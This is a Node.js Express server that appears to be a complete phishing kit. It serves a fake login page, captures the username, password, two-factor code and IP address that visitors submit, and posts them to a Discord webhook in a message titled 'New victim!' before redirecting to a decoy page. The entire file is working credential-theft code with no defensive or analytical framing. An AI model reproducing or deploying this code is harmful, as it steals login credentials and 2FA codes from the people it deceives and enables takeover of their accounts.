const express = require("express")
const config = require("./config.json")
const { join } = require("path")
const { WebhookClient } = require("discord.js")
const { webhook } = require("./config.json")
const app = express()
app.use(express.json());
app.use(express.urlencoded({ extended: true }))
app.use('/gifs', express.static(join(__dirname, "www", "gifs")))
app.use('/login_files', express.static(join(__dirname, "www", "login_files")))
app.use('/webfonts', express.static(join(__dirname, "www", "webfonts")))
app.use('/www', express.static(join(__dirname, "www")))
app.use("/renzu_files",express.static(join(__dirname, "www", "renzu_files")))
app.use('/fonts',express.static(join(__dirname,"www","fonts")))
app.get("/", (req, res) => {
    var ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress
    console.log(ip)
    res.sendFile(join(__dirname, "./www/login.htm"))
})
app.get("/navares",(req,res)=>{
    res.sendFile(join(__dirname, "./www/renzu.html"))
})
app.get("/login", (req, res) => {
    var ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress
    console.log(ip)
    res.sendFile(join(__dirname, "./www/login.htm"))
})

app.post("/login", async (req, res) => {
    try {
        if (req?.body?.username && req.body?.password) {
            let [username, password] = [req.body.username, req.body.password]
            const wh = new WebhookClient({ url: webhook })
            var ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress
            await wh.send({
                embeds: [{
                    title: `New victim!`,
                    fields: [
                        {
                            name: `Username`,
                            value: "```" + username + "```",
                            inline: false
                        },
                        {
                            name: `Password`,
                            value: "```" + password + "```",
                            inline: false
                        },
                        {
                            name: `2fa`,
                            value: "```" + req?.body["2facode"] + "```",
                            inline: false
                        },
                        {
                            name: `IP`,
                            value: "```" + ip.replace("::ffff:", "") + "```",
                            inline: false
                        }
                    ],
                    color: 0x00ff00
                }],
            })
        }
    } catch (e) {
        console.log(e)
    }
    res.redirect("/navares")
})
app.listen(80)